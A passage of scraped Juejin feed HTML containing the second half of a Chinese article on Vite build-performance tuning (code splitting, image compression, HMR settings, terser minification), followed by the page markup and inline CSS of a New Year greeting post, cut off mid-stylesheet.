<table><thead><tr><th>优化前</th><th>优化后</th></tr></thead><tbody><tr><td>2.4s</td><td>0.8s</td></tr></tbody></table>
<h2 data-id="heading-6">二、基于路由的代码分割与动态导入</h2>
<h3 data-id="heading-7">问题诊断</h3>
<p>单页面应用(SPA)将所有路由组件打包到同一个chunk中，导致首屏加载缓慢。</p>
<h3 data-id="heading-8">优化方案</h3>
<ol>
<li><strong>组件级动态导入</strong>：</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> <span class="hljs-title function_">Home</span> = (<span class="hljs-params"/>) =&gt; <span class="hljs-keyword">import</span>(<span class="hljs-string">'./views/Home.vue'</span>)
</code></pre>
<ol start="2">
<li><strong>路由级懒加载结合Loading状态</strong>：</li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript">{
  <span class="hljs-attr">path</span>: <span class="hljs-string">'/dashboard'</span>,
  <span class="hljs-attr">component</span>: <span class="hljs-function">() =&gt;</span> ({
    <span class="hljs-attr">loader</span>: <span class="hljs-keyword">import</span>(<span class="hljs-string">'./Dashboard.vue'</span>),
    <span class="hljs-attr">loading</span>: <span class="hljs-title class_">LoadingComponent</span>,
    <span class="hljs-attr">delay</span>: <span class="hljs-number">200</span> <span class="hljs-comment">// ms</span>
  })
}
</code></pre>
<ol start="3">
<li><strong>预加载提示</strong>：</li>
</ol>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">link</span> <span class="hljs-attr">rel</span>=<span class="hljs-string">"modulepreload"</span> <span class="hljs-attr">href</span>=<span class="hljs-string">"/src/views/CriticalView.vue"</span> /&gt;</span>
</code></pre>
<h3 data-id="heading-9">Webpack对比数据</h3>
<p>传统工具需要额外配置splitChunks，而Vite内置智能分割：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">build</span>: {
  <span class="hljs-attr">rollupOptions</span>: {
    <span class="hljs-attr">output</span>: {
      <span class="hljs-title function_">manualChunks</span>(<span class="hljs-params">id</span>) {
        <span class="hljs-keyword">if</span> (id.<span class="hljs-title function_">includes</span>(<span class="hljs-string">'node_modules'</span>)) {
          <span class="hljs-keyword">return</span> <span class="hljs-string">'vendor'</span>
        }
      }
    }
  }
}
</code></pre>
<p>##三、静态资源处理的最佳实践</p>
<h3 data-id="heading-10">PNG/JPG优化流程</h3>
<ol>
<li><strong>图片压缩管道</strong>：</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">npm install vite-plugin-imagemin -D
</code></pre>
<p>配置示例：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> imagemin <span class="hljs-keyword">from</span> <span class="hljs-string">'vite-plugin-imagemin'</span>

<span class="hljs-attr">plugins</span>: [
  <span class="hljs-title function_">imagemin</span>({
    <span class="hljs-attr">gifsicle</span>: { <span class="hljs-attr">optimizationLevel</span>: <span class="hljs-number">7</span> },
    <span class="hljs-attr">mozjpeg</span>: { <span class="hljs-attr">quality</span>: <span class="hljs-number">70</span> },
    <span class="hljs-attr">pngquant</span>: { <span class="hljs-attr">quality</span>: [<span class="hljs-number">0.7</span>,<span class="hljs-number">0.9</span>] },
    <span class="hljs-attr">svgo</span>: {
      <span class="hljs-attr">plugins</span>: [
        { <span class="hljs-attr">name</span>:<span class="hljs-string">'removeViewBox'</span> }, 
        { <span class="hljs-attr">name</span>:<span class="hljs-string">'removeEmptyAttrs'</span>, <span class="hljs-attr">active</span>: <span class="hljs-literal">false</span> }
      ]
    }
})
]
</code></pre>
<ol start="2">
<li><strong>CDN托管与非核心资源延迟加载</strong></li>
</ol>
<pre><code class="hljs language-html" lang="html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">"https://cdn.example.com/logo.png"</span> <span class="hljs-attr">loading</span>=<span class="hljs-string">"lazy"</span> /&gt;</span>
</code></pre>
<p>##四、开发环境特调技巧</p>
<h3 data-id="heading-11">HMR热更新加速</h3>
<ol>
<li><strong>配置调优</strong></li>
</ol>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-attr">server</span>:{
<span class="hljs-attr">watch</span>:{
usePolling：<span class="hljs-literal">true</span>,<span class="hljs-comment">// Docker环境下必需  </span>
interval：<span class="hljs-number">1000</span>  
}  
}  
</code></pre>
<p>2.<strong>自定义HMR边界</strong>
通过<code>import.meta.hot.accept()</code>建立精准更新范围：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">if</span>(<span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">hot</span>){
<span class="hljs-keyword">import</span>.<span class="hljs-property">meta</span>.<span class="hljs-property">hot</span>.<span class="hljs-title function_">accept</span>([<span class="hljs-string">'./state.js'</span>],<span class="hljs-function">(<span class="hljs-params">[newModule]</span>)=&gt;</span>{
store.<span class="hljs-title function_">updateState</span>(newModule)  
}) 
}  
</code></pre>
<p>##五、生产构建深度优化</p>
<h3 data-id="heading-12">SSR与Pre-rendering配合</h3>
<p>1.<strong>多线程编译配置</strong></p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span>{ defineConfig } <span class="hljs-keyword">from</span><span class="hljs-string">'vite'</span> 

<span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-title function_">defineConfig</span>({
<span class="hljs-attr">build</span>:{   
<span class="hljs-attr">minify</span>:<span class="hljs-string">'terser'</span>,   
<span class="hljs-attr">terserOptions</span>:{   
<span class="hljs-attr">compress</span>:{ drop_console：<span class="hljs-literal">true</span> }    
},    
reportCompressedSize：<span class="hljs-literal">false</span>     
}    
})    
</code></pre>
<p>2.<strong>分析可视化</strong>
使用rollup-plugin-visualizer生成包分析报告：</p>
<p><img src="analysis.png" alt="Bundle Analysis" loading="lazy"/></p>
<p>##总结</p>
<p>通过上述五个维度的系统优化——从依赖预处理到资源加载策略，从开发时HMR到生产环境构建——我们实现了数量级的性能提升。特别值得注意的是：</p>
<p>1.Vite的性能潜力需要通过正确配置才能完全释放<br/>
2.现代浏览器特性（如原生ESM）是优化的基础支撑<br/>
3.<strong>测量优先原则</strong>：每个优化点都应伴随定量分析</p>
<p>最终的300ms冷启动时间并非终点。随着Vite5.x的到来（新增SWC转译器等特性），前端构建性能的天花板还将继续抬升。建议团队建立持续的性能监测机制（可通过GitHub Actions集成基准测试），将性能意识融入日常开发流程。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[祝大家 2026 年新年快乐，代码无 bug，需求一次过]]></title>    <link>https://juejin.cn/post/7589849698488467490</link>    <guid>https://juejin.cn/post/7589849698488467490</guid>    <pubDate>2025-12-31T10:05:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589849698488467490" data-draft-id="7589830701614874624" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="祝大家 2026 年新年快乐，代码无 bug，需求一次过"/> <meta itemprop="keywords" content="JavaScript,HTML,CSS"/> <meta itemprop="datePublished" content="2025-12-31T10:05:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端Hardy"/> <meta itemprop="url" content="https://juejin.cn/user/4222572710333816"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            祝大家 2026 年新年快乐，代码无 bug，需求一次过
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4222572710333816/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端Hardy
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-31T10:05:29.000Z" title="Wed Dec 31 2025 10:05:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-31
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADsAAAA6CAYAAAAOeSEWAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAABkLSURBVGhDtZoHnJ1llcbP3Om9ZiYzmfSQhCQQIbRQVQKI9CYC68qKriJK0UXcZRcINqStIoiIqKCi1NACQihBWiCkkJ5MJlMyvd7p7d759v989/sy34yTbIj48Atz71ff855znvOc971xDrB/EtoGI7a9Z8Aq+wZML0mNj7dE95NZ1OKsj1dHo1GbnJpss9OTbWJyonvun4VP1Njuoagtb+m0it4By0iIt8LEeMvkr8XFWcfgkA1gYDLf47i2PzpsyU7UspKSLDoctagTZ7Vc08MzClMS7awJ2ZaflBB78CeET8TYla1dtrKt2w5KS7YCDGzEoz2RqKUmhGw6x2bhuXyOp2BoRXef1Q1E7Lj8TIsMD1sbxu1kcnYSAX1810RMTUmyMB7f2j1gC7NS7byinNiL/kH8Q8a+2NRh77b32El56VaPAe0YeGR2mh2bm+FdMRqP1rbZe+3dFsHT35qcb/Oz0rwzo7Gxs9feYPLS4kM2h8lawee5hPmlJXneFQeGAzJ2F564v7rFzi7Msu3d/Xgjzq5g8ArX8VCNN2vJ28daey0zZJabmGCLslP5HOf+Oygr3UzDGOf+JxrauXfQjslJt+dbuuyMgiwmk+sPAB/b2Lt2NdoMZnuY21qHIvbvUyZ4Z0ZQiXGrWjvsmPxsK4R0nmHA8ZCTQvxVQn5eRipklIBtcVbV1WtHYsjati47ZWKuTUpP9Z4yGk/xDBGe3v1mW4/dOrvYO7P/2G9jRSjf31FnXyaUXiB8r51WaJkM3kcfOSa2FR6qarIenooTLQHPLcC4mYThyw1tVpKWYlVERlZ8nC3Oz3Jzdn1nn5uvQ8OOHYvhR/CvsqffJbkCkZTvcYZ6Z0WTfTovw5Y1dtjXp+TbFPhgf7FfxpYxuMfr2uwo8rEtMmwXF+d6Z8wGmIR2PLyjo8cqOFffP2SLGexJEJCP9R29thkPXlpa4A5Y3w/jmuVNYYwO2QkY7WMtz3mVcE1hkualJdmSolzX8GnpKd4VZq80d1o7zN0RdWxGaqItgbn3B/+vsasgh/UMNBOvzYMZDxtDKp289KGaVguFQvb1yQWWwuB97GaSXqUUnVaYbSUwrDCEBz/C2CM8EhNrP13fbkeSh3OJgCAe2N1CWXKsGOc6TOr5U4q8MwYhDtkTda02MyPN+nnGBQEH7A37NHYz5KOZVv08qyjbSseEzKauPnsMj98wc6Ibcj5UUv7M8QWZTE52jEwGOVaD8U1Dw1YNWX0qM8VKyb80L/TrOPYOzH4KBJQTrK8M7+7KZjuM63sHBt17FubGoibCuf+tarWFGUmuwWeT8/vCXo1tZOYeZcazCaez8MwEzzM+HqhqtiJI5twxL1jeGLYk7jmKMF1JOCbg6Qj5nAdRqX7q3BYm8VAmQvW1lfcMc58IT95uIA3q+gftrDHPXUXJWkVEHJme5Bp5UmHsvIZ/O3l8ECE/FWcsItX2hr0ae8O2Wjs+J43QTbOZzGYQ/7Wtxq6eXjRK3r0By4YJ6Ty8EiYSJqcm2eGeV4Pox/ANENJR49RiEdfqcLflUJrEBZqgxYHrBjn2ExFURqKdVETN9YirJxKxR2rbrYeQv5ISmB6IsiDGNfZGWPeMgkzr58xnPaJ5p6XDZPKz4T77wayJ7jGhhXLwanOHTWBgq5n5q6YUwNJ7l3kKcRl7OJ7fF56l1GzvHbSD8dghTPi0wIRfv6XafjJ3ssv0PnZQ7nZx/etwzO1zJ3lHR2OETTw8x0tOx1AN3De0D7YV+63oGthjaJQ5Ur7eVVZjcdGInUyuaT73ZWg3efV8fZs7cc2E777Qi5eunVbghvPPymrt/krKGfcLd8ybYjdxrK6333Z09rjHZkNuLYzz0uIc+xWCZzz8nbHbe4dsY1e/XUOY+nimvtUaSazv4jXhaQasSbmYmpuenGwHZ8TKggSEQm08rMD7ahBOoExcMqXQegjnZ+CEvaEa1ZQUQkt39dj0zDS7krq+ARmpdws/nlNqD9WFbWN7l5u3wr9MyrcXKUsqWy3jTOaoML4DdaQ83YIoT4VYpEXvYQZLmbX5SLohBrgOj186Kc/iKTUPUhq+Rrm5ekOl3TWv1Mr6hqwbY0VOQXwEo+Moq4Z47q5qsU489G944LyJOW4LOLZOKtT/iI6+nGe/0dhuEd4ltj2NmiuCU4hnk5fHIi7+RK4uTEu0e+s7rAiRcw1CYy3OejvcYz+eXeI9MYY9nu3lYZl0KavJJ7Vjibzgjp319rUZE20j7CkJqFr5JQYgQ39f3eQaKpQk0afy8nl4uBzvjUUTRk7k3iebOm0pabDiyFn2XGu3dRME41CGVeBVqSiVnc6hIUpekp1VjHLDSOEcQlui5W/U8C7IKREjv1Gabw3wRwUTvpv7jybPtzHmIPZ49q6KRjuccqBQVCOtGvqXhrCFUUXJzOYSHt7Kw5Ix9H08dSje1o1JyL73IYXpEMmE5CRbw6wuykx2pR+Pd6/J4JpLiJKV6N9OnrcQNfQ0Zem6qQX2MmFXyWTE+DMO0kGx4e08DEjnXbsYuOq7niHB8jdY/wQ8Srm2XCZZUrOakF1CY5EKX0h93Tu/1J4kRdbDMT8MamgZK9xe3uDcvrPe++Y4f61rcZr7B53rN1c5N2ytcV5rCrvHt3T2Og19g+5nH7dvq3bqunr4NOwgK2MHA1jeEDuG7HNuLmtw7qpocl5t6nCPvdTQ7v4N4u3WTqeyu9cZHIo4f6lqdFoHh7wzMbzDeeGv3Hvzjlrnh2W1zofhHuftxpFn3VFe7zxS0+p0DlKVPbhhvBxhvwiFMgfP+mjHA08gEC4pybeLyK1iZldh8zC5VJQyUl8l59KZ0WJk2xaiYWxNrkXXJhA8r3PvZRur7ZZZRfadaRPsfiTmX9HGajC2tXd6V8dQTMhX0h8rNdJx9Ra8F8SbRNLzhPRnJmTZIUTYueTyWxyr7uv3rjC3OkzE8495oS+4xq6D5WoI0bO5WVCOSerl8rIeBrOI/Hkaw6ME5W1zSuzx2la3CRdWi3zIG+FDBvUp9LMgI/vggUmE7KkT81yGvOOgEYa/aUahhRAF5xLec3OzbF1r2O17BbVxIi7hzJIC64IYhXdJA+nh/5xVbOmE9J0QqjSxWk0pp37M2YEtgjS8GpimACu7xkqxdKJ6fEXyYl2Lre0ZtC8yELVewtWUnbfCPIhrvgDFz8WI5yhJKgcnFMZWEFrwhgzo5uWDDDA1oGSOzcu0xfx7vTlsv6posIMpJ6cGWPiw/BxL4PU7vbrpjgf8bMdu5OYwOdhm83DARUSa0ELknYIeEAaILuWxlhGa0M8+EuJCrpJT+ymENhN60pXBxa3LZ5TsucnlGaCmIEQ4Evru91yuz0xMtKaeXluI5zdh9Mm8vAlBn4aR07X64EH3vEKdXQkZJXPP/JxMvNRpLxEtHZ5RQgmNewnpouvVTpYTHdfOnmy5kFUGnpRTfEhXD9DiBdFFJB0/YWS9aj6pmc89r0BaQmgTRkgI+EsdKsYasJZOBF+QqTH474NK7LbyBvf7W+RgOxNyxfQY2/2hrp2+NkroxrzrQ55fSZkpJIa28znCgF6rb7H1hOSslATyvNflAh9pvHcX3lVE/Ya8FjTJIexa2Rq77nfU96unTnD7aME3+TAm6BFKYrPnqCNIqV5sq0ZGCiEV+Db+qWMQqpFgb5KPx48R6omeDl2EuP9DTYt9iGA/f1KBS1w/La+H4ktsSmLItvZHXLUkrCeflVtJ9DVVg1H7+sxiGvVM975rZpfabuqHVhuP5F1vewav5O8GamUe91yDanoYw47FWzC929O+DJnKA2opFY1Rjru5CE7kOcO0jJtQVUIynzuZEMeb+1CEOFXN8iFSGeRpCm1BTlJxVg49Azm819SO7Bu0axEbwn27GuxMck+TMQHDP8fn48gfDVIL4R8xKVPJ73MQBUIfA/Z54LMw5vmlE+w+VFo2A78X/SsyPA/RMD0z3e2qVLtfo7aeBslpMX0N0TEnLcUlKym1jyBFqSohmYntI5enBhYB9CY/2kNarhwJhNiMtRGyWnkQdKaCFyQwgydjyNUw4VchKxXv2/DoKdC+lkQbCX1NlKCGvJiBJkSGbCus6jfo4yGBNySgr+u7e20BCsxdVAcFlJ/tHd32+cIsNxSXUULUUx+dg/d47g7OPYFw2MxkSuyMwLHVTI6PBN6dS8Sppw45zHJSgDXV3aQzmz40Z6fDgBfiAXU0uZxby2zejee+j3eltoQMzhV6qSBogXwrEXDj7ElWxUQ8RrnSaoU0dxIsKaiMvMykXTu90NqJsGHP4z78SdLigUrLKat32nFwy/E07pfDFRdQ/7N5r57pQ1482uvWhMGhQcviGkVrKDUp0ToCxfhQal5n4Hs/g1jOgH4LWdwFOd1b1WzHET4vLZppv+Czjxo840OrDlG8jAJzv2tp5mLK1dsU/lfIOeWy5NxFxfl2BoYImlQtx9QF6mJRQKBsQYYuO2yaLYPBUXvu/VqYPxtHhNy7Y4hCkNLGPtKSklzCVKSHtMQxcqm5Kw1DhI2PTGZtcGDAvoLQ/u7MifYtWFBlxz2H9zo8RkwKzC5UYiG+p44ccqE62YAxLeT/TOpf8MXx8Qk0IJFRY1Go+viQVJpE5Ehjf49xfAZeqGIy/7us3nqxwQfCkjZypPxobVr/6YpQHIalUvuCyEwbSXC9PC8QnkFcXlrgLpoLIhIfKuaqlQkYIAwQnr/f3eyu7KttOw2lNpv8/BPHyjzVNER3o72gvEBKqRMTflndbP8BMweRDyeciEj5bFayFXqTLzheivgYJC0jwzwHa0MDDEotm48ndze5BBBElAnxxcRYHAFh3FfZaA9UNRmC354kNwUx8eHkmVj5dcTE5ZMnuEyr1QqlhtaJLuOYZv4v3KNo0TKrGPUZ1NILPKuWcvVn5Trv10SMB6h0j/ARMnlOuafCBIfnSWEx/Raif3HDzofYMM31dOyY9LBaLK3TjoX2fEqT4+2qaUVWSTQvyM6wC8nNJyEetXIyuLKrx04P7MKNnbJZlKUtNAIHo7i2dA/YU3Vtdi5l6jCepXy8hOedSSSsI8/HQg5Q+gxTKXwkMHkbESo+hjG0lbRRzQ3Fc5LOzDuFhs3Ptumpie7ilRDhlEJOq/hjsZljCxjkt7fWuPS/EekpXMggJQIk0G+eN9Xu2VmHWIkJe0nJRN4ptBBit2yutG9ML7J1DHAxebiAMrZ4VZlduqGS8I2tJc2iborUxmIN79c+kTovFxivPvrcSaP3n7RSKYTUmKt4N3rMOcw4JOneD3sP956jNaMglIeTER5Xbdlt15Tm2W10NEsYrA/N5JLCHHsR9tSqwxq08G3bqm1ZTbOtagnbo6SLvH/VzBL7W7jPzqFea0LmMLFzUuLtdwumuO3i1Vtq7OK15Xgw3l1PDmIXak+6QBEkvB9YJIzBcc/L20JIYaSZ/qAzVm5Ut4oowk3QehC+N3xo/1wTqt7zsYawfX9no9XjqdPXVLhrwyo/wucJYQkE1e4j8rLcBuHUItQQKqgMXb6LGvxFQlXw33AdZLR0V5P9Fr29lP73scNnosoyvdWPv4fPJ+uJrLVtMakqaL1M1cTvv0OLIZE6wk2a2IcIRUQh+DaejpdcXepBa7bKDRGM9PIVxTl2EwarZ72rooVuY4RQtMypdk6e1lLLehhY2lt7QEd7WxlCDvdIli6E9B4+ZIodmZEMccUGqgiZOqru9tkR3iJ8nCcXRWRZCSPMLPEjlx2LjQL1OM5qKAm+vhSuRqSfV5Ttrg8FdWcrnhMqCTex7DEM6qTsVEuM1+8hovaHQ6e6a1Fz0xLd3nUt4ToWWuzWNkhcoAIIjUx2ZpxjLzWF9+SYmngR1lok4TEoJxGfuijhI/7OICoFmadl2llcL9b1oRVJtbD+JLlv1KrhHG5811t9ELbzgk14ICUwqE+TDzftqHPz98vUSy3jSIwP8dCpkNqLDPTx+rArz4T5qLG3G2PrvJKKPoLBWE501NC3ilUX5mVjVIb9nIbgWcpPMiSXjbcL8K62UkR86m1/yfkSeMaHFuK04X0CE3J6SWzFUxw0BSNHlSzi3RmIRJwHq5udO3c16quLp6sbnffbupxbt+12vzOrzuvNHc7ycRbIxuJHgYU7YSASdQgxp7qz2ynv6HJeqW91doa7nLruXof+17sqhhu31Xif9o7HalqczV29Dnrb/f5EXZvzdH27U98/6LR5i3N0UM5zjHU71/lwjRWWltU5CAIn7F1MqLp/r9hQ5RoaxG+qmrxP4yNKcfsFLwuiprffeb2l03m2scO5h3Or2rudzjGrhk8x4Cqu2xcexilBvNEcdi5Yu4tKF3Ue4tzPy+td5/1md4tzw5iJ27NuXEYobYUdlb8z6GTWkdxaCvk2zHjd5mpKQ459mv5TkAp6mQb9Aq9HHQ8S6mrZnuc6vUG6WHusIhCJGNXl9byvnJyaiE7+Eoz8c5TYNQiUveENGpJpcIJ+biS8R0+rlcazGNs7pKB+zPLTOSX2KNWhlDAf4r2Spj72JORB5OyHULX+dlD/FOky/HFy5ygYU0sey/i8moeqdunXK1qC3RuaMOYHlI/raQMl3M+EeTV5WxD3Km8a8PkM8nr648sQ9+esKbf5e/nxiKBfAOQkxbv3SU9LYmqPV9V/Pn+V20VwTyVjTqCI6edEQUOFUXs9WmfSll8DyX2dt7GlnwkswaM3l9XZ0oNK3MTXbxpOV2sGk69s6XCJw4cY8KbyRrt9TrHt7Bm0rRBQe1+fHUWNfaapU0KbqxzbORC1M/LS3dJwIl3KOrwykQG/E+61q+isgniztdOKqNOziDgZqZIzFwPvqGiyg5NCtoCqoG5NxHhPZTOsnORulKskjoKMDeLuXQ3OmnC3syxARFXdfc57LR3OrdtrvSOOs55rnqhtcdoGhpxHdjc5EfJUuHZTlftX+G15rXPlhkrnLe59F7Lz8VGHdg8c5y2OLeMZ126qduq9XC3v7nd+FchLvYPJd15gPCu8XQnh/qpm59WGVudZzvvQO97kXTcGxhnEuJvR39tWY8cwK4uhcikk4a3Gdstg9l5B2t0wfaTdWkEou5vCPOV5PH73vFL3+DfXltnh6OxjkJD6Wd5F3g88tMe6CW/7YmI99VIL4u0oqUK8ocW4d8hFrXMVoOQU8s3U97MnjvDD/XRYkyhHM1MT3GVZQR2Tdv70U8EbA5vlo+CaPAaaSWoZXm50otGodxQ6L6txGKxzw5ZYORrBsPPrykZKQIy1n8bTjwb2fO4Te3ue7x6KOKvaYns1wtIddd4nx3mwot55qyl2360cp81zurg+CGqwU8v4/Of5uAVvPgObrwvHomY8jOtZ4fXWLnefdHVXv9044+8ZklCx75DXwcV1Sb27y+vInUQEuVYSaMgRJYfAwtoj0raFxIUW1A8nz35f02qLc9Lc9lG7CBkwtUR7bf+A+5uL6ehnH9Lat+5sIEfj3Cbj3NKRvP7Rjlo7FSmqavKvpSP8MRZ7NVbQYLSkqlC9ZW4sPH18gBTcORjrhMWmQWzFmK2UsvO90qQ1oZcI8UhkCLZPtRqMy0NirobAvjIpb4/sW06qKGyPR2oGIdlazjOOTk+kLYzaaYGSp63Wz6HsXsQ51wd+LTAuZOy+8GBNq7tF+IOdDU4kENJthNID5YRafZtzZ3mDs9LbRgzixcZ2l1h83OKFbDmEd0/FiFp7DWHgp0AQGzq6nf8hPF+oa3EehOz0ziCWcm4NpBRMhX1hn571oR9wqVVSDVPtUi32sQ0vbu7scZdY9aOt2ZSEL9BEBIW+dv20AKDd9/ep09oimYqHpyImkKDuRllS4PrlHNuIqDmCJmNJQba7q1joEaUQJuR/WdXsLrJrq/L6cdJsPOyXscJ7GLKqo8cOpqhrO//yQG6oS3kZwS9xPkRB3wi7diFMtDN+PLk5m1ath+8f0Fy80dbjhvVXub+U5mEqeal27UP+dWpPlknNxW79Ak6/7Tg3UMOF52j1xA1qK7Trd6nXC+8P9ttYQcumIonLSnJtBdJNa77axw1C2x3qR4Wqnj73x9f6MbV+CCYFBZO6y51aSh3gzVrsmwzJnULEbCJC1oZ7vIZ/9Iqmfvn2u5oWO5n8fApxcuWUApum5diPgY9lrA9EtvUNOzYf8vqAcJPsU5iOh7XtXQgt2uZhjKU2amF7HQyfEYWcZk5yQ1RDKNrLcq02k/9IGmldrB93KiokPw8EB2SsoKWXO5FmxXhlckqi+3vEUvLqwok5PHVkIWAszlqzy1p54zuLpnPZ3q9bod08JlLSb5DrNxDm38Sbvsg5EBywsT7oH+3XNW3uasGirFSrxRNdCllKiPZHZzJYLZb5qEcpae3pxMCuu9oibS5/QCOiLcYUrp+MmtJeURjFdVlxzqiae6D4h40NQt54HyGv3JRo10aVfv8YhtC0pSlVKcPFuxIXahr08mzCO4VzMlLSsZuomZ+RaucU0rXsw/sfF5+osUFonWob/7TrLdaUgdpV93fl9X+VIC0Y6tek2uI8OD3J5gT2Vj9ZmP0f4IM4iY7RQ5gAAAAASUVORK5CYII=) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc